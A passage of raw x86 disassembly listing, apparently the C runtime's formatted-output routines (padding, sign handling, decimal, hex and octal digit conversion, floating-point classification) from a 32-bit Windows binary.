  405ce3:	mov    eax,DWORD PTR [esp+0x90]
  405cea:	add    eax,0x4
  405ced:	mov    DWORD PTR [esp+0x90],eax
  405cf4:	jmp    0x4054f2
  405cf9:	mov    edi,DWORD PTR [edi]
  405cfb:	mov    DWORD PTR [esp+0x2c],0x0
  405d03:	mov    DWORD PTR [esp+0x28],edi
  405d07:	mov    edi,DWORD PTR [esp+0x90]
  405d0e:	add    edi,0x4
  405d11:	mov    DWORD PTR [esp+0x90],edi
  405d18:	jmp    0x40581b
  405d1d:	or     ah,0x2
  405d20:	mov    DWORD PTR [esp+0x40],0x8
  405d28:	mov    DWORD PTR [esp+0x38],eax
  405d2c:	jmp    0x405512
  405d31:	lea    ebp,[ebx+0x3]
  405d34:	movzx  edx,BYTE PTR [ebx+0x3]
  405d38:	mov    DWORD PTR [esp+0x10],0x2
  405d40:	mov    edi,0x4
  405d45:	mov    ebx,ebp
  405d47:	jmp    0x405473
  405d4c:	lea    edx,[esp+0x34]
  405d50:	mov    eax,0x25
  405d55:	mov    ebp,esi
  405d57:	call   0x403bd0
  405d5c:	jmp    0x4054f2
  405d61:	movsx  eax,WORD PTR [esp+0x28]
  405d66:	mov    DWORD PTR [esp+0x90],edx
  405d6d:	mov    DWORD PTR [esp+0x28],eax
  405d71:	sar    eax,0x1f
  405d74:	mov    DWORD PTR [esp+0x2c],eax
  405d78:	jmp    0x405732
  405d7d:	mov    DWORD PTR [eax],edx
  405d7f:	mov    eax,DWORD PTR [esp+0x90]
  405d86:	add    eax,0x4
  405d89:	mov    DWORD PTR [esp+0x90],eax
  405d90:	jmp    0x4054f2
  405d95:	movzx  ecx,WORD PTR [esp+0x28]
  405d9a:	mov    DWORD PTR [esp+0x2c],0x0
  405da2:	mov    DWORD PTR [esp+0x90],edx
  405da9:	mov    DWORD PTR [esp+0x28],ecx
  405dad:	jmp    0x40581b
  405db2:	test   edi,edi
  405db4:	jne    0x405e2b
  405db6:	or     DWORD PTR [esp+0x38],0x400
  405dbe:	neg    DWORD PTR [esp+0x3c]
  405dc2:	jmp    0x405aa2
  405dc7:	movzx  edx,BYTE PTR [esp+0x28]
  405dcc:	mov    DWORD PTR [esp+0x2c],0x0
  405dd4:	mov    DWORD PTR [esp+0x28],edx
  405dd8:	jmp    0x40581b
  405ddd:	movsx  eax,BYTE PTR [esp+0x28]
  405de2:	mov    DWORD PTR [esp+0x28],eax
  405de6:	sar    eax,0x1f
  405de9:	mov    DWORD PTR [esp+0x2c],eax
  405ded:	jmp    0x405732
  405df2:	mov    edi,edx
  405df4:	sar    edi,0x1f
  405df7:	mov    DWORD PTR [eax+0x4],edi
  405dfa:	mov    eax,DWORD PTR [esp+0x90]
  405e01:	add    eax,0x4
  405e04:	mov    DWORD PTR [esp+0x90],eax
  405e0b:	jmp    0x4054f2
  405e10:	lea    ebp,[ebx+0x3]
  405e13:	movzx  edx,BYTE PTR [ebx+0x3]
  405e17:	mov    DWORD PTR [esp+0x10],0x3
  405e1f:	mov    edi,0x4
  405e24:	mov    ebx,ebp
  405e26:	jmp    0x405473
  405e2b:	movzx  edx,BYTE PTR [ebx+0x1]
  405e2f:	mov    DWORD PTR [esp+0x40],0xffffffff
  405e37:	mov    ebx,ebp
  405e39:	mov    DWORD PTR [esp+0x90],ecx
  405e40:	mov    DWORD PTR [esp+0x14],0x0
  405e48:	jmp    0x405473
  405e4d:	nop
  405e4e:	nop
  405e4f:	nop
  405e50:	push   ebx
  405e51:	mov    ebx,eax
  405e53:	sub    esp,0x48
  405e56:	mov    eax,DWORD PTR [esp+0x50]
  405e5a:	mov    DWORD PTR [esp+0x20],eax
  405e5e:	mov    eax,DWORD PTR [esp+0x54]
  405e62:	mov    DWORD PTR [esp+0x24],eax
  405e66:	mov    eax,DWORD PTR [esp+0x58]
  405e6a:	mov    DWORD PTR [esp+0x28],eax
  405e6e:	mov    eax,DWORD PTR [esp+0x5c]
  405e72:	fld    TBYTE PTR [esp+0x20]
  405e76:	mov    DWORD PTR [esp+0x2c],eax
  405e7a:	fxam   
  405e7c:	fstsw  ax
  405e7f:	fstp   st(0)
  405e81:	test   ah,0x1
  405e84:	je     0x405ea0
  405e86:	test   ah,0x4
  405e89:	je     0x405f20
  405e8f:	mov    DWORD PTR [esp+0x38],0x3
  405e97:	movzx  edx,WORD PTR [esp+0x28]
  405e9c:	xor    ecx,ecx
  405e9e:	jmp    0x405eb4
  405ea0:	test   ah,0x4
  405ea3:	jne    0x405f01
  405ea5:	movzx  edx,WORD PTR [esp+0x28]
  405eaa:	mov    DWORD PTR [esp+0x38],0x0
  405eb2:	xor    ecx,ecx
  405eb4:	and    edx,0x8000
  405eba:	mov    eax,DWORD PTR [esp+0x68]
  405ebe:	mov    DWORD PTR [eax],edx
  405ec0:	lea    eax,[esp+0x3c]
  405ec4:	mov    DWORD PTR [esp+0x10],ebx
  405ec8:	mov    DWORD PTR [esp+0x4],ecx
  405ecc:	mov    DWORD PTR [esp],0x40c034
  405ed3:	mov    DWORD PTR [esp+0x1c],eax
  405ed7:	mov    eax,DWORD PTR [esp+0x64]
  405edb:	mov    DWORD PTR [esp+0x18],eax
  405edf:	mov    eax,DWORD PTR [esp+0x60]
  405ee3:	mov    DWORD PTR [esp+0x14],eax
  405ee7:	lea    eax,[esp+0x38]
  405eeb:	mov    DWORD PTR [esp+0xc],eax
  405eef:	lea    eax,[esp+0x20]
  405ef3:	mov    DWORD PTR [esp+0x8],eax
  405ef7:	call   0x408460
  405efc:	add    esp,0x48
  405eff:	pop    ebx
  405f00:	ret    
  405f01:	test   ah,0x40
  405f04:	je     0x405f30
  405f06:	mov    DWORD PTR [esp+0x38],0x2
  405f0e:	movzx  edx,WORD PTR [esp+0x28]
  405f13:	mov    ecx,0xffffbfc3
  405f18:	jmp    0x405eb4
  405f1a:	lea    esi,[esi+0x0]
  405f20:	mov    DWORD PTR [esp+0x38],0x4
  405f28:	xor    ecx,ecx
  405f2a:	xor    edx,edx
  405f2c:	jmp    0x405eba
  405f2e:	xchg   ax,ax
  405f30:	movzx  edx,WORD PTR [esp+0x28]
  405f35:	mov    DWORD PTR [esp+0x38],0x1
  405f3d:	mov    ecx,edx
  405f3f:	and    ecx,0x7fff
  405f45:	sub    ecx,0x403e
  405f4b:	jmp    0x405eb4
  405f50:	push   ebx
  405f51:	sub    esp,0x28
  405f54:	mov    ebx,DWORD PTR [edx+0x4]
  405f57:	test   bh,0x40
  405f5a:	jne    0x405f64
  405f5c:	mov    ecx,DWORD PTR [edx+0x20]
  405f5f:	cmp    DWORD PTR [edx+0x24],ecx
  405f62:	jle    0x405f72
  405f64:	and    bh,0x20
  405f67:	jne    0x405f80
  405f69:	mov    ecx,DWORD PTR [edx+0x20]
  405f6c:	mov    ebx,DWORD PTR [edx]
  405f6e:	mov    WORD PTR [ebx+ecx*2],ax
  405f72:	add    ecx,0x1
  405f75:	mov    DWORD PTR [edx+0x20],ecx
  405f78:	add    esp,0x28
  405f7b:	pop    ebx
  405f7c:	ret    
  405f7d:	lea    esi,[esi+0x0]
  405f80:	mov    ecx,DWORD PTR [edx]
  405f82:	movzx  eax,ax
  405f85:	mov    DWORD PTR [esp+0x1c],edx
  405f89:	mov    DWORD PTR [esp],eax
  405f8c:	mov    DWORD PTR [esp+0x4],ecx
  405f90:	call   0x40ad18
  405f95:	mov    edx,DWORD PTR [esp+0x1c]
  405f99:	mov    ecx,DWORD PTR [edx+0x20]
  405f9c:	add    ecx,0x1
  405f9f:	mov    DWORD PTR [edx+0x20],ecx
  405fa2:	add    esp,0x28
  405fa5:	pop    ebx
  405fa6:	ret    
  405fa7:	mov    esi,esi
  405fa9:	lea    edi,[edi+eiz*1+0x0]
  405fb0:	push   ebp
  405fb1:	push   edi
  405fb2:	mov    edi,edx
  405fb4:	push   esi
  405fb5:	push   ebx
  405fb6:	mov    esi,eax
  405fb8:	mov    ebx,ecx
  405fba:	sub    esp,0x3c
  405fbd:	lea    eax,[esp+0x1c]
  405fc1:	mov    DWORD PTR [esp+0x4],0x0
  405fc9:	mov    DWORD PTR [esp+0x8],eax
  405fcd:	lea    eax,[esp+0x20]
  405fd1:	mov    DWORD PTR [esp],eax
  405fd4:	call   0x40ab00
  405fd9:	mov    ebp,DWORD PTR [ebx+0xc]
  405fdc:	cmp    ebp,edi
  405fde:	jge    0x406091
  405fe4:	test   ebp,ebp
  405fe6:	js     0x406091
  405fec:	mov    eax,DWORD PTR [ebx+0x8]
  405fef:	cmp    ebp,eax
  405ff1:	jge    0x40609e
  405ff7:	sub    eax,ebp
  405ff9:	test   eax,eax
  405ffb:	mov    DWORD PTR [ebx+0x8],eax
  405ffe:	jle    0x4060ca
  406004:	test   BYTE PTR [ebx+0x5],0x4
  406008:	jne    0x4060b5
  40600e:	sub    eax,0x1
  406011:	mov    DWORD PTR [ebx+0x8],eax
  406014:	mov    edx,ebx
  406016:	mov    eax,0x20
  40601b:	call   0x405f50
  406020:	mov    eax,DWORD PTR [ebx+0x8]
  406023:	lea    edx,[eax-0x1]
  406026:	test   eax,eax
  406028:	mov    DWORD PTR [ebx+0x8],edx
  40602b:	jne    0x406014
  40602d:	test   ebp,ebp
  40602f:	lea    edi,[ebp-0x1]
  406032:	jle    0x40607c
  406034:	movzx  edx,WORD PTR [esi]
  406037:	test   dx,dx
  40603a:	jne    0x40604b
  40603c:	jmp    0x40607c
  40603e:	xchg   ax,ax
  406040:	movzx  edx,WORD PTR [esi]
  406043:	sub    edi,0x1
  406046:	test   dx,dx
  406049:	je     0x40607c
  40604b:	movzx  eax,dx
  40604e:	mov    edx,ebx
  406050:	add    esi,0x2
  406053:	call   0x405f50
  406058:	test   edi,edi
  40605a:	jg     0x406040
  40605c:	mov    eax,DWORD PTR [ebx+0x8]
  40605f:	lea    edx,[eax-0x1]
  406062:	test   eax,eax
  406064:	mov    DWORD PTR [ebx+0x8],edx
  406067:	jle    0x406089
  406069:	lea    esi,[esi+eiz*1+0x0]
  406070:	mov    edx,ebx
  406072:	mov    eax,0x20
  406077:	call   0x405f50
  40607c:	mov    eax,DWORD PTR [ebx+0x8]
  40607f:	lea    edx,[eax-0x1]
  406082:	test   eax,eax
  406084:	mov    DWORD PTR [ebx+0x8],edx
  406087:	jg     0x406070
  406089:	add    esp,0x3c
  40608c:	pop    ebx
  40608d:	pop    esi
  40608e:	pop    edi
  40608f:	pop    ebp
  406090:	ret    
  406091:	mov    eax,DWORD PTR [ebx+0x8]
  406094:	mov    ebp,edi
  406096:	cmp    ebp,eax
  406098:	jl     0x405ff7
  40609e:	test   ebp,ebp
  4060a0:	mov    DWORD PTR [ebx+0x8],0xffffffff
  4060a7:	lea    edi,[ebp-0x1]
  4060aa:	jg     0x406034
  4060ac:	mov    DWORD PTR [ebx+0x8],0xfffffffe
  4060b3:	jmp    0x406089
  4060b5:	test   ebp,ebp
  4060b7:	lea    edi,[ebp-0x1]
  4060ba:	jle    0x4060e3
  4060bc:	movzx  edx,WORD PTR [esi]
  4060bf:	test   dx,dx
  4060c2:	jne    0x40604b
  4060c4:	sub    DWORD PTR [ebx+0x8],0x1
  4060c8:	jmp    0x406070
  4060ca:	test   ebp,ebp
  4060cc:	lea    edi,[ebp-0x1]
  4060cf:	jle    0x4060eb
  4060d1:	movzx  edx,WORD PTR [esi]
  4060d4:	test   dx,dx
  4060d7:	jne    0x40604b
  4060dd:	sub    DWORD PTR [ebx+0x8],0x1
  4060e1:	jmp    0x406089
  4060e3:	sub    eax,0x1
  4060e6:	mov    DWORD PTR [ebx+0x8],eax
  4060e9:	jmp    0x406070
  4060eb:	sub    eax,0x1
  4060ee:	mov    DWORD PTR [ebx+0x8],eax
  4060f1:	jmp    0x406089
  4060f3:	lea    esi,[esi+0x0]
  4060f9:	lea    edi,[edi+eiz*1+0x0]
  406100:	push   ebp
  406101:	push   edi
  406102:	push   esi
  406103:	push   ebx
  406104:	mov    esi,eax
  406106:	mov    ebx,ecx
  406108:	sub    esp,0x3c
  40610b:	mov    edi,DWORD PTR [ecx+0xc]
  40610e:	cmp    edi,edx
  406110:	jge    0x4061e0
  406116:	test   edi,edi
  406118:	js     0x4061e0
  40611e:	mov    eax,DWORD PTR [ebx+0x8]
  406121:	cmp    edi,eax
  406123:	jge    0x4061d1
  406129:	sub    eax,edi
  40612b:	test   eax,eax
  40612d:	mov    DWORD PTR [ebx+0x8],eax
  406130:	jle    0x40613c
  406132:	test   BYTE PTR [ebx+0x5],0x4
  406136:	je     0x4061f0
  40613c:	test   edi,edi
  40613e:	lea    ebp,[esp+0x14]
  406142:	jg     0x406165
  406144:	jmp    0x4061bc
  406146:	lea    esi,[esi+0x0]
  406149:	lea    edi,[edi+eiz*1+0x0]
  406150:	movzx  edx,WORD PTR [esp+0x18]
  406155:	add    esi,eax
  406157:	movzx  eax,dx
  40615a:	mov    edx,ebx
  40615c:	call   0x405f50
  406161:	test   edi,edi
  406163:	je     0x4061bc
  406165:	mov    DWORD PTR [esp],esi
  406168:	mov    DWORD PTR [esp+0x14],0x0
  406170:	sub    edi,0x1
  406173:	call   0x40acd0
  406178:	mov    DWORD PTR [esp+0x8],eax
  40617c:	lea    eax,[esp+0x18]
  406180:	mov    DWORD PTR [esp+0xc],ebp
  406184:	mov    DWORD PTR [esp+0x4],esi
  406188:	mov    DWORD PTR [esp],eax
  40618b:	call   0x40a850
  406190:	test   eax,eax
  406192:	je     0x4061bc
  406194:	jns    0x406150
  406196:	movsx  dx,BYTE PTR [esi]
  40619a:	mov    eax,0x1
  40619f:	mov    WORD PTR [esp+0x18],dx
  4061a4:	jmp    0x406155
  4061a6:	lea    esi,[esi+0x0]
  4061a9:	lea    edi,[edi+eiz*1+0x0]
  4061b0:	mov    edx,ebx
  4061b2:	mov    eax,0x20
  4061b7:	call   0x405f50
  4061bc:	mov    eax,DWORD PTR [ebx+0x8]
  4061bf:	lea    edx,[eax-0x1]
  4061c2:	test   eax,eax
  4061c4:	mov    DWORD PTR [ebx+0x8],edx
  4061c7:	jg     0x4061b0
  4061c9:	add    esp,0x3c
  4061cc:	pop    ebx
  4061cd:	pop    esi
  4061ce:	pop    edi
  4061cf:	pop    ebp
  4061d0:	ret    
  4061d1:	mov    DWORD PTR [ebx+0x8],0xffffffff
  4061d8:	jmp    0x40613c
  4061dd:	lea    esi,[esi+0x0]
  4061e0:	mov    edi,edx
  4061e2:	jmp    0x40611e
  4061e7:	mov    esi,esi
  4061e9:	lea    edi,[edi+eiz*1+0x0]
  4061f0:	sub    eax,0x1
  4061f3:	mov    DWORD PTR [ebx+0x8],eax
  4061f6:	lea    esi,[esi+0x0]
  4061f9:	lea    edi,[edi+eiz*1+0x0]
  406200:	mov    edx,ebx
  406202:	mov    eax,0x20
  406207:	call   0x405f50
  40620c:	mov    eax,DWORD PTR [ebx+0x8]
  40620f:	lea    edx,[eax-0x1]
  406212:	test   eax,eax
  406214:	mov    DWORD PTR [ebx+0x8],edx
  406217:	jne    0x406200
  406219:	jmp    0x40613c
  40621e:	xchg   ax,ax
  406220:	push   ebp
  406221:	push   edi
  406222:	push   esi
  406223:	push   ebx
  406224:	sub    esp,0x1c
  406227:	test   eax,eax
  406229:	mov    DWORD PTR [ecx+0xc],0xffffffff
  406230:	je     0x406270
  406232:	mov    ebp,DWORD PTR [ecx+0x4]
  406235:	lea    edi,[esp+0xd]
  406239:	lea    eax,[esp+0xc]
  40623d:	mov    BYTE PTR [esp+0xc],0x2d
  406242:	and    ebp,0x20
  406245:	xor    esi,esi
  406247:	movzx  ebx,BYTE PTR [edx+esi*1]
  40624b:	and    ebx,0xffffffdf
  40624e:	or     ebx,ebp
  406250:	mov    BYTE PTR [edi+esi*1],bl
  406253:	add    esi,0x1
  406256:	cmp    esi,0x3
  406259:	jne    0x406247
  40625b:	lea    edx,[edi+0x3]
  40625e:	sub    edx,eax
  406260:	call   0x406100
  406265:	add    esp,0x1c
  406268:	pop    ebx
  406269:	pop    esi
  40626a:	pop    edi
  40626b:	pop    ebp
  40626c:	ret    
  40626d:	lea    esi,[esi+0x0]
  406270:	mov    ebp,DWORD PTR [ecx+0x4]
  406273:	test   ebp,0x100
  406279:	je     0x406290
  40627b:	mov    BYTE PTR [esp+0xc],0x2b
  406280:	lea    edi,[esp+0xd]
  406284:	lea    eax,[esp+0xc]
  406288:	jmp    0x406242
  40628a:	lea    esi,[esi+0x0]
  406290:	test   ebp,0x40
  406296:	je     0x4062b0
  406298:	mov    BYTE PTR [esp+0xc],0x20
  40629d:	lea    edi,[esp+0xd]
  4062a1:	lea    eax,[esp+0xc]
  4062a5:	jmp    0x406242
  4062a7:	mov    esi,esi
  4062a9:	lea    edi,[edi+eiz*1+0x0]
  4062b0:	lea    eax,[esp+0xc]
  4062b4:	mov    edi,eax
  4062b6:	jmp    0x406242
  4062b8:	nop
  4062b9:	lea    esi,[esi+eiz*1+0x0]
  4062c0:	push   ebp
  4062c1:	mov    ebp,esp
  4062c3:	push   edi
  4062c4:	push   esi
  4062c5:	push   ebx
  4062c6:	mov    ebx,eax
  4062c8:	mov    edi,ecx
  4062ca:	mov    esi,edx
  4062cc:	sub    esp,0x3c
  4062cf:	mov    DWORD PTR [ebp-0x20],eax
  4062d2:	mov    eax,DWORD PTR [ecx+0xc]
  4062d5:	mov    ecx,0x0
  4062da:	mov    DWORD PTR [ebp-0x1c],edx
  4062dd:	test   eax,eax
  4062df:	mov    DWORD PTR [ebp-0x34],eax
  4062e2:	cmovns ecx,eax
  4062e5:	mov    eax,DWORD PTR [edi+0x4]
  4062e8:	add    ecx,0x17
  4062eb:	test   ah,0x10
  4062ee:	mov    DWORD PTR [ebp-0x2c],eax
  4062f1:	je     0x4062fe
  4062f3:	cmp    WORD PTR [edi+0x1c],0x0
  4062f8:	jne    0x406512
  4062fe:	mov    edx,DWORD PTR [edi+0x8]
  406301:	mov    eax,ecx
  406303:	cmp    ecx,edx
  406305:	mov    DWORD PTR [ebp-0x38],edx
  406308:	cmovl  eax,edx
  40630b:	add    eax,0xf
  40630e:	and    eax,0xfffffff0
  406311:	call   0x4039a0
  406316:	sub    esp,eax
  406318:	test   BYTE PTR [ebp-0x2c],0x80
  40631c:	lea    eax,[esp+0x10]
  406320:	mov    DWORD PTR [ebp-0x24],eax
  406323:	je     0x40633d
  406325:	mov    eax,DWORD PTR [ebp-0x1c]
  406328:	test   eax,eax
  40632a:	js     0x4065a0
  406330:	and    DWORD PTR [ebp-0x2c],0xffffff7f
  406337:	mov    eax,DWORD PTR [ebp-0x2c]
  40633a:	mov    DWORD PTR [edi+0x4],eax
  40633d:	mov    eax,esi
  40633f:	or     eax,ebx
  406341:	je     0x4065b2
  406347:	mov    eax,DWORD PTR [ebp-0x24]
  40634a:	mov    DWORD PTR [ebp-0x30],edi
  40634d:	mov    ecx,eax
  40634f:	mov    eax,DWORD PTR [ebp-0x2c]
  406352:	mov    edi,ecx
  406354:	and    eax,0x1000
  406359:	mov    DWORD PTR [ebp-0x28],eax
  40635c:	lea    esi,[esi+eiz*1+0x0]
  406360:	lea    ecx,[edi+0x1]
  406363:	mov    DWORD PTR [esp],ebx
  406366:	mov    DWORD PTR [esp+0x4],esi
  40636a:	mov    DWORD PTR [esp+0x8],0xa
  406372:	mov    DWORD PTR [esp+0xc],0x0
  40637a:	mov    DWORD PTR [ebp-0x20],ecx
  40637d:	call   0x40b0a0
  406382:	add    eax,0x30
  406385:	mov    BYTE PTR [edi],al
  406387:	mov    DWORD PTR [esp],ebx
  40638a:	mov    DWORD PTR [esp+0x4],esi
  40638e:	mov    DWORD PTR [esp+0x8],0xa
  406396:	mov    DWORD PTR [esp+0xc],0x0
  40639e:	call   0x40af90
  4063a3:	mov    ebx,eax
  4063a5:	mov    eax,edx
  4063a7:	mov    esi,edx
  4063a9:	or     eax,ebx
  4063ab:	mov    ecx,DWORD PTR [ebp-0x20]
  4063ae:	je     0x406400
  4063b0:	cmp    DWORD PTR [ebp-0x24],ecx
  4063b3:	je     0x4063e0
  4063b5:	mov    eax,DWORD PTR [ebp-0x28]
  4063b8:	test   eax,eax
  4063ba:	je     0x4063e0
  4063bc:	mov    eax,DWORD PTR [ebp-0x30]
  4063bf:	cmp    WORD PTR [eax+0x1c],0x0
  4063c4:	je     0x4063e0
  4063c6:	mov    eax,ecx
  4063c8:	sub    eax,DWORD PTR [ebp-0x24]
  4063cb:	cdq    
  4063cc:	shr    edx,0x1e
  4063cf:	add    eax,edx
  4063d1:	and    eax,0x3
  4063d4:	sub    eax,edx
  4063d6:	cmp    eax,0x3
  4063d9:	je     0x4063f0
  4063db:	nop
  4063dc:	lea    esi,[esi+eiz*1+0x0]
  4063e0:	mov    edi,ecx
  4063e2:	jmp    0x406360
  4063e7:	mov    esi,esi
  4063e9:	lea    edi,[edi+eiz*1+0x0]
  4063f0:	lea    ecx,[edi+0x2]
  4063f3:	mov    BYTE PTR [edi+0x1],0x2c
  4063f7:	mov    edi,ecx
  4063f9:	jmp    0x406360
  4063fe:	xchg   ax,ax
  406400:	mov    edi,DWORD PTR [ebp-0x30]
  406403:	mov    esi,DWORD PTR [ebp-0x34]
  406406:	mov    ebx,ecx
  406408:	test   esi,esi
  40640a:	jle    0x40642b
  40640c:	mov    eax,DWORD PTR [ebp-0x24]
  40640f:	mov    ebx,ecx
  406411:	sub    eax,ecx
  406413:	add    eax,esi
  406415:	test   eax,eax
  406417:	jle    0x40642b
  406419:	lea    ebx,[ecx+eax*1]
  40641c:	lea    esi,[esi+eiz*1+0x0]
  406420:	add    ecx,0x1
  406423:	mov    BYTE PTR [ecx-0x1],0x30
  406427:	cmp    ecx,ebx
  406429:	jne    0x406420
  40642b:	cmp    ebx,DWORD PTR [ebp-0x24]
  40642e:	jne    0x406440
  406430:	mov    edx,DWORD PTR [ebp-0x34]
  406433:	test   edx,edx
  406435:	je     0x406440
  406437:	mov    BYTE PTR [ebx],0x30
  40643a:	add    ebx,0x1
  40643d:	lea    esi,[esi+0x0]
  406440:	mov    esi,DWORD PTR [ebp-0x38]
  406443:	test   esi,esi
  406445:	jle    0x4064a4
  406447:	mov    eax,DWORD PTR [ebp-0x24]
  40644a:	sub    eax,ebx
  40644c:	add    eax,esi
  40644e:	test   eax,eax
  406450:	mov    DWORD PTR [edi+0x8],eax
  406453:	jle    0x4064a4
  406455:	test   DWORD PTR [ebp-0x2c],0x1c0
  40645c:	je     0x406464
  40645e:	sub    eax,0x1
  406461:	mov    DWORD PTR [edi+0x8],eax
  406464:	mov    eax,DWORD PTR [ebp-0x34]
  406467:	test   eax,eax
  406469:	js     0x406550
  40646f:	test   DWORD PTR [ebp-0x2c],0x400
  406476:	jne    0x4064a4
  406478:	mov    eax,DWORD PTR [edi+0x8]
  40647b:	lea    edx,[eax-0x1]
  40647e:	test   eax,eax
  406480:	mov    DWORD PTR [edi+0x8],edx
  406483:	jle    0x4064a4
  406485:	mov    edx,edi
  406487:	mov    eax,0x20
  40648c:	call   0x405f50
  406491:	mov    eax,DWORD PTR [edi+0x8]
  406494:	lea    edx,[eax-0x1]
  406497:	test   eax,eax
  406499:	mov    DWORD PTR [edi+0x8],edx
  40649c:	jg     0x406485
  40649e:	mov    eax,DWORD PTR [edi+0x4]
  4064a1:	mov    DWORD PTR [ebp-0x2c],eax
  4064a4:	test   BYTE PTR [ebp-0x2c],0x80
  4064a8:	je     0x406501
  4064aa:	lea    esi,[ebx+0x1]
  4064ad:	mov    BYTE PTR [ebx],0x2d
  4064b0:	cmp    DWORD PTR [ebp-0x24],esi
  4064b3:	mov    ebx,DWORD PTR [ebp-0x24]
  4064b6:	jae    0x4064ec
  4064b8:	nop
  4064b9:	lea    esi,[esi+eiz*1+0x0]
  4064c0:	sub    esi,0x1
  4064c3:	movsx  eax,BYTE PTR [esi]
  4064c6:	mov    edx,edi
  4064c8:	call   0x405f50
  4064cd:	cmp    esi,ebx
  4064cf:	jne    0x4064c0
  4064d1:	mov    eax,DWORD PTR [edi+0x8]
  4064d4:	lea    edx,[eax-0x1]
  4064d7:	test   eax,eax
  4064d9:	mov    DWORD PTR [edi+0x8],edx
  4064dc:	jle    0x4064f9
  4064de:	xchg   ax,ax
  4064e0:	mov    edx,edi
  4064e2:	mov    eax,0x20
  4064e7:	call   0x405f50
  4064ec:	mov    eax,DWORD PTR [edi+0x8]
  4064ef:	lea    edx,[eax-0x1]
  4064f2:	test   eax,eax
  4064f4:	mov    DWORD PTR [edi+0x8],edx
  4064f7:	jg     0x4064e0
  4064f9:	lea    esp,[ebp-0xc]
  4064fc:	pop    ebx
  4064fd:	pop    esi
  4064fe:	pop    edi
  4064ff:	pop    ebp
  406500:	ret    
  406501:	test   DWORD PTR [ebp-0x2c],0x100
  406508:	je     0x406530
  40650a:	lea    esi,[ebx+0x1]
  40650d:	mov    BYTE PTR [ebx],0x2b
  406510:	jmp    0x4064b0
  406512:	mov    eax,ecx
  406514:	mov    edx,0x55555556
  406519:	imul   edx
  40651b:	mov    eax,ecx
  40651d:	sar    eax,0x1f
  406520:	sub    edx,eax
  406522:	add    ecx,edx
  406524:	jmp    0x4062fe
  406529:	lea    esi,[esi+eiz*1+0x0]
  406530:	test   BYTE PTR [ebp-0x2c],0x40
  406534:	mov    esi,ebx
  406536:	je     0x4064b0
  40653c:	add    esi,0x1
  40653f:	mov    BYTE PTR [ebx],0x20
  406542:	jmp    0x4064b0
  406547:	mov    esi,esi
  406549:	lea    edi,[edi+eiz*1+0x0]
  406550:	mov    eax,DWORD PTR [ebp-0x2c]
  406553:	and    eax,0x600
  406558:	cmp    eax,0x200
  40655d:	jne    0x40646f
  406563:	mov    eax,DWORD PTR [edi+0x8]
  406566:	lea    edx,[eax-0x1]
  406569:	test   eax,eax
  40656b:	mov    DWORD PTR [edi+0x8],edx
  40656e:	jle    0x4064a4
  406574:	add    eax,ebx
  406576:	lea    esi,[esi+0x0]
  406579:	lea    edi,[edi+eiz*1+0x0]
  406580:	add    ebx,0x1
  406583:	mov    BYTE PTR [ebx-0x1],0x30
  406587:	cmp    ebx,eax
  406589:	jne    0x406580
  40658b:	mov    DWORD PTR [edi+0x8],0xffffffff
  406592:	jmp    0x4064a4
  406597:	mov    esi,esi
  406599:	lea    edi,[edi+eiz*1+0x0]
  4065a0:	mov    ebx,DWORD PTR [ebp-0x20]
  4065a3:	mov    esi,DWORD PTR [ebp-0x1c]
  4065a6:	neg    ebx
  4065a8:	adc    esi,0x0
  4065ab:	neg    esi
  4065ad:	jmp    0x40633d
  4065b2:	mov    ecx,DWORD PTR [ebp-0x24]
  4065b5:	jmp    0x406403
  4065ba:	lea    esi,[esi+0x0]
  4065c0:	push   ebp
  4065c1:	mov    ebp,esp
  4065c3:	push   edi
  4065c4:	push   esi
  4065c5:	push   ebx
  4065c6:	mov    edi,ecx
  4065c8:	mov    esi,edx
  4065ca:	sub    esp,0x2c
  4065cd:	cmp    eax,0x6f
  4065d0:	mov    DWORD PTR [ebp-0x28],eax
  4065d3:	mov    DWORD PTR [ebp-0x34],ecx
  4065d6:	mov    eax,0x18
  4065db:	mov    ecx,0x12
  4065e0:	cmovne eax,ecx
  4065e3:	mov    DWORD PTR [ebp-0x24],edx
  4065e6:	mov    cl,0x0
  4065e8:	mov    edx,eax
  4065ea:	setne  al
  4065ed:	movzx  ebx,al
  4065f0:	movzx  eax,al
  4065f3:	add    eax,0x3
  4065f6:	lea    ebx,[ebx*8+0x7]
  4065fd:	mov    DWORD PTR [ebp-0x1c],eax
  406600:	mov    eax,DWORD PTR [ebp+0x8]
  406603:	mov    eax,DWORD PTR [eax+0xc]
  406606:	test   eax,eax
  406608:	mov    DWORD PTR [ebp-0x2c],eax
  40660b:	cmovns ecx,eax
  40660e:	mov    eax,DWORD PTR [ebp+0x8]
  406611:	lea    ecx,[edx+ecx*1]
  406614:	mov    eax,DWORD PTR [eax+0x4]
  406617:	test   ah,0x10
  40661a:	mov    DWORD PTR [ebp-0x38],eax
  40661d:	je     0x40662d
  40661f:	mov    eax,DWORD PTR [ebp+0x8]
  406622:	cmp    WORD PTR [eax+0x1c],0x0
  406627:	jne    0x406860
  40662d:	mov    eax,DWORD PTR [ebp+0x8]
  406630:	mov    eax,DWORD PTR [eax+0x8]
  406633:	cmp    ecx,eax
  406635:	mov    edx,eax
  406637:	mov    DWORD PTR [ebp-0x30],eax
  40663a:	mov    eax,ecx
  40663c:	cmovl  eax,edx
  40663f:	add    eax,0xf
  406642:	and    eax,0xfffffff0
  406645:	call   0x4039a0
  40664a:	sub    esp,eax
  40664c:	mov    eax,DWORD PTR [ebp-0x34]
  40664f:	or     eax,DWORD PTR [ebp-0x24]
  406652:	mov    DWORD PTR [ebp-0x20],esp
  406655:	mov    eax,esp
  406657:	je     0x406950
  40665d:	movzx  ecx,BYTE PTR [ebp-0x28]
  406661:	and    ecx,0x20
  406664:	mov    BYTE PTR [ebp-0x24],cl
  406667:	jmp    0x40668d
  406669:	lea    esi,[esi+eiz*1+0x0]
  406670:	mov    BYTE PTR [eax-0x1],cl
  406673:	movzx  ecx,BYTE PTR [ebp-0x1c]
  406677:	xor    edx,edx
  406679:	shrd   esi,edi,cl
  40667c:	shr    edi,cl
  40667e:	test   cl,0x20
  406681:	cmovne esi,edi
  406684:	cmovne edi,edx
  406687:	mov    ecx,edi
  406689:	or     ecx,esi
  40668b:	je     0x4066b0
  40668d:	mov    edx,esi
  40668f:	add    eax,0x1
  406692:	and    edx,ebx
  406694:	lea    ecx,[edx+0x30]
  406697:	cmp    cl,0x39
  40669a:	jbe    0x406670
  40669c:	add    edx,0x37
  40669f:	or     dl,BYTE PTR [ebp-0x24]
  4066a2:	mov    BYTE PTR [eax-0x1],dl
  4066a5:	jmp    0x406673
  4066a7:	mov    esi,esi
  4066a9:	lea    edi,[edi+eiz*1+0x0]
